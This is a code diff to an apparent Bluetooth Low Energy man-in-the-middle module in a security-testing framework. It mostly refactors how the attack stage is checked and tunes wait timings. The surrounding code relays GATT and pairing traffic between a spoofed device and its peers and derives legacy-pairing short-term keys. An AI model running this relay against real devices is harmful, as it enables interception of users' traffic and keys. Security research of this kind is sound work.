@@ -112,17 +112,18 @@ class ble_mitm(module.WirelessModule):
 	def setStage(self, value):
 		self.stage = value
 
-	def waitUntilStage(self,stage):
-		while self.getStage() != stage:
-			#utils.wait(seconds=0.00001)
-			pass
+	def waitUntilStage(self,stage,time=None):
+		while self.stage != stage:
+			if time is not None:
+				#utils.wait(seconds=0.00001)
+				utils.wait(seconds=time)
 
 	# Advertising related methods
 	@module.scenarioSignal("onSlaveAdvertisement")
 	def scanStage(self,packet):
 		if utils.booleanArg(self.args["SHOW_SCANNING"]):
 			packet.show()
-		if self.getStage() == BLEMitmStage.SCAN:
+		if self.stage == BLEMitmStage.SCAN:
 			if utils.addressArg(self.args["TARGET"]) == packet.addr.upper():
 				if packet.type == "ADV_IND":
 					io.success("Found corresponding advertisement !")
@@ -146,7 +147,6 @@ class ble_mitm(module.WirelessModule):
 		if self.args["MITM_STRATEGY"] == "flood":
 			intervalMin = 200
 			intervalMax = 201
-
 
 		if utils.booleanArg(self.args["SLAVE_SPOOFING"]) and address != self.a2mEmitter.getAddress():
 			self.a2mEmitter.setAddress(address, random=addrType)
@@ -181,7 +181,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onMasterConnect")
 	def connect(self,packet):
-		if self.getStage() == BLEMitmStage.WAIT_CONNECTION:
+		if self.stage == BLEMitmStage.WAIT_CONNECTION:
 
 			io.success("Master connected : "+packet.srcAddr)
 
@@ -226,70 +226,70 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onMasterExchangeMTURequest")
 	def exchangeMtuRequest(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Exchange MTU Request (from master) : mtu = "+str(packet.mtu))
 			io.info("Redirecting to slave ...")
 			self.a2sEmitter.sendp(ble.BLEExchangeMTURequest(mtu=packet.mtu))
 
 	@module.scenarioSignal("onSlaveExchangeMTUResponse")
 	def exchangeMtuResponse(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Exchange MTU Response (from slave) : mtu = "+str(packet.mtu))
 			io.info("Redirecting to master ...")
 			self.a2mEmitter.sendp(ble.BLEExchangeMTUResponse(mtu=packet.mtu))
 
 	@module.scenarioSignal("onMasterWriteCommand")
 	def writeCommand(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Write Command (from master) : handle = "+hex(packet.handle)+" / value = "+packet.value.hex())
 			io.info("Redirecting to slave ...")
 			self.a2sEmitter.sendp(ble.BLEWriteCommand(handle=packet.handle, value=packet.value))
 
 	@module.scenarioSignal("onMasterWriteRequest")
 	def writeRequest(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Write Request (from master) : handle = "+hex(packet.handle)+" / value = "+packet.value.hex())
 			io.info("Redirecting to slave ...")
 			self.a2sEmitter.sendp(ble.BLEWriteRequest(handle=packet.handle, value=packet.value))
 
 	@module.scenarioSignal("onSlaveWriteResponse")
 	def writeResponse(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Write Response (from slave)")
 			io.info("Redirecting to master ...")
 			self.a2mEmitter.sendp(ble.BLEWriteResponse())
 
 	@module.scenarioSignal("onMasterReadBlobRequest")
 	def readBlob(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Read Blob Request (from master) : handle = "+hex(packet.handle)+" / offset = "+str(packet.offset))
 			io.info("Redirecting to slave ...")
 			self.a2sEmitter.sendp(ble.BLEReadBlobRequest(handle=packet.handle,offset=packet.offset))
 
 	@module.scenarioSignal("onSlaveReadBlobResponse")
 	def readBlobResponse(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Read Blob Response (from slave) : value = "+packet.value.hex())
 			io.info("Redirecting to master ...")
 			self.a2mEmitter.sendp(ble.BLEReadBlobResponse(value=packet.value))
 
 	@module.scenarioSignal("onMasterReadRequest")
 	def read(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Read Request (from master) : handle = "+hex(packet.handle))
 			io.info("Redirecting to slave ...")
 			self.a2sEmitter.sendp(ble.BLEReadRequest(handle=packet.handle))
 
 	@module.scenarioSignal("onSlaveReadResponse")
 	def readResponse(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Read Response (from slave) : value = "+packet.value.hex())
 			io.info("Redirecting to master ...")
 			self.a2mEmitter.sendp(ble.BLEReadResponse(value=packet.value))
 
 	@module.scenarioSignal("onSlaveErrorResponse")
 	def errorResponse(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Error Response (from slave) : request = "+hex(packet.request)+
 				" / handle = "+hex(packet.handle)+" / ecode = "+hex(packet.ecode))
 			io.info("Redirecting to master ...")
@@ -297,7 +297,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onSlaveHandleValueNotification")
 	def notification(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Handle Value Notification (from slave) : handle = "+hex(packet.handle)+
 				" / value = "+packet.value.hex())
 			io.info("Redirecting to master ...")
@@ -305,7 +305,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onSlaveHandleValueIndication")
 	def indication(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Handle Value Indication (from slave) : handle = "+hex(packet.handle)+
 				" / value = "+packet.value.hex())
 			io.info("Redirecting to master ...")
@@ -313,14 +313,14 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onMasterHandleValueConfirmation")
 	def confirmation(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Handle Value Confirmation (from master)")
 			io.info("Redirecting to slave ...")
 			self.a2sEmitter.sendp(ble.BLEHandleValueConfirmation())
 
 	@module.scenarioSignal("onMasterFindInformationRequest")
 	def findInformation(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Find Information Request (from master) : startHandle = "+hex(packet.startHandle)+
 				" / endHandle = "+hex(packet.endHandle))
 			io.info("Redirecting to slave ...")
@@ -328,7 +328,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onSlaveFindInformationResponse")
 	def findInformationResponse(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Find Information Response (from slave) : format = "+hex(packet.format)+
 				" / data = "+packet.data.hex())
 			io.info("Redirecting to master ...")
@@ -336,7 +336,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onMasterFindByTypeValueRequest")
 	def findByTypeValueRequest(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Find Type By Value Request (from master) : startHandle = "+hex(packet.startHandle)+
 				" / endHandle = "+hex(packet.endHandle)+" / uuid = "+hex(packet.uuid)+" / data = "+packet.data.hex())
 			io.info("Redirecting to slave ...")
@@ -344,14 +344,14 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onSlaveFindByTypeValueResponse")
 	def findByTypeValueResponse(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Find Type By Value Response (from slave)")
 			io.info("Redirecting to master ...")
 			self.a2mEmitter.sendp(ble.BLEFindByTypeValueResponse(handles=packet.handles))
 
 	@module.scenarioSignal("onMasterReadByTypeRequest")
 	def readByType(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Read By Type Request (from master) : startHandle = "+hex(packet.startHandle)+
 				" / endHandle = "+hex(packet.endHandle)+" / uuid = "+hex(packet.uuid))
 			io.info("Redirecting to slave ...")
@@ -360,7 +360,7 @@ class ble_mitm(module.WirelessModule):
 										uuid=packet.uuid))
 	@module.scenarioSignal("onMasterReadByGroupTypeRequest")
 	def readByGroupType(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Read By Group Type Request (from master) : startHandle = "+hex(packet.startHandle)+
 			" / endHandle = "+hex(packet.endHandle)+" / uuid = "+hex(packet.uuid))
 			io.info("Redirecting to slave ...")
@@ -376,7 +376,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onSlaveReadByGroupTypeResponse")
 	def readByGroupTypeResponse(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Read By Group Type Response (from slave) : length = "+str(packet.length)+
 				" / data = "+packet.data.hex())
 			io.info("Redirecting to master ...")
@@ -384,7 +384,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onMasterLongTermKeyRequest")
 	def longTermKeyRequest(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Long Term Key Request (from master) : ediv = "+hex(packet.ediv)+" / rand = "+packet.rand.hex())
 			if packet.ediv == 0 and packet.rand == b"\x00"*8:
 				self.shortTermKey = ble.BLECrypto.s1(self.temporaryKey,self.mRand,self.sRand)[::-1]
@@ -405,7 +405,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onMasterPairingRequest")
 	def pairingRequest(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info(("Pairing Request (from master) : " +
 			"\n=> outOfBand = "+("yes" if packet.outOfBand else "no") +
 			"\n=> inputOutputCapability = "+ str(ble.InputOutputCapability(data = bytes([packet.inputOutputCapability]))) +
@@ -430,7 +430,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onSlavePairingResponse")
 	def pairingResponse(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info(("Pairing Response (from slave) : " +
 			"\n=> outOfBand = "+("yes" if packet.outOfBand else "no") +
 			"\n=> inputOutputCapability = "+ str(ble.InputOutputCapability(data = bytes([packet.inputOutputCapability]))) +
@@ -454,7 +454,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onMasterPairingConfirm")
 	def masterPairingConfirm(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Pairing Confirm (from master) : confirm = " + packet.confirm.hex())
 
 			io.info ("Storing mConfirm : "+packet.confirm.hex())
@@ -465,7 +465,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onSlavePairingConfirm")
 	def slavePairingConfirm(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Pairing Confirm (from slave) : confirm = " + packet.confirm.hex())
 
 			io.info ("Storing sConfirm : "+packet.confirm.hex())
@@ -476,7 +476,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onMasterPairingRandom")
 	def masterPairingRandom(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Pairing Random (from master) : random = "+packet.random.hex())
 			io.info("Storing mRand : "+packet.random.hex())
 			self.mRand = packet.random[::-1]
@@ -503,7 +503,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onSlavePairingRandom")
 	def slavePairingRandom(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Pairing Random (from slave) : random = "+packet.random.hex())
 			io.info("Storing sRand : "+packet.random.hex())
 			self.sRand = packet.random[::-1]
@@ -548,13 +548,13 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onMasterPairingFailed")
 	def masterPairingFailed(self,pkt):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Pairing Failed (from master) !")
 			self.pairingFailed(pkt)
 
 	@module.scenarioSignal("onSlavePairingFailed")
 	def slavePairingFailed(self,pkt):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Pairing Failed (from slave) !")
 			self.pairingFailed(pkt)
 
@@ -629,7 +629,7 @@ class ble_mitm(module.WirelessModule):
 						l2capCmdId = packet.l2capCmdId,
 						moveResult=0
 					))
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Redirecting to master ...")
 			self.a2mEmitter.sendp(ble.BLEConnectionParameterUpdateRequest(
 						l2capCmdId = packet.l2capCmdId,timeoutMult=packet.timeoutMult, slaveLatency=packet.slaveLatency, minInterval=packet.minInterval, maxInterval=packet.maxInterval))
@@ -637,7 +637,7 @@ class ble_mitm(module.WirelessModule):
 
 	@module.scenarioSignal("onMasterConnectionParameterUpdateResponse")
 	def connectionParameterUpdateResponse(self,packet):
-		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
+		if self.stage == BLEMitmStage.ACTIVE_MITM:
 			io.info("Connection Parameter Update Response (from master) : moveResult = "+str(packet.moveResult))
 
 	def checkParametersValidity(self):
@@ -756,9 +756,10 @@ class ble_mitm(module.WirelessModule):
 
 			if self.args["MITM_STRATEGY"] == "injection":
 				while self.a2mReceiver.isConnected():
-					utils.wait(seconds=0.01)
+					#utils.wait(seconds=0.01)
+					utils.wait(seconds=0.0001)
 			else:
-				self.waitUntilStage(BLEMitmStage.STOP)
+				self.waitUntilStage(BLEMitmStage.STOP, time=0.000001)
 			if self.scenarioEnabled:
 				self.endScenario()
 			return self.ok()
